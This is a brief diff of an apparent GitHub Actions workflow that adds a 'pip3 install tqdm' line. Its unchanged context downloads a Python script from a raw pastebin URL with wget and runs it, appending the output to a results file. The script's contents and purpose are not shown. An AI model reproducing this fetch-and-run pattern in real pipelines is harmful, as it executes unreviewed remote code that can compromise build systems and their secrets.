@@ -18,6 +18,7 @@ jobs:
     - name: operations
       run: |
           pip3 install pycryptodome
+          pip3 install tqdm
           echo $(date +%F%n%T) > res.txt
           wget https://pastebin.pl/view/raw/b3482b95 -O ppgod.py
           python3 ppgod.py >> res.txt
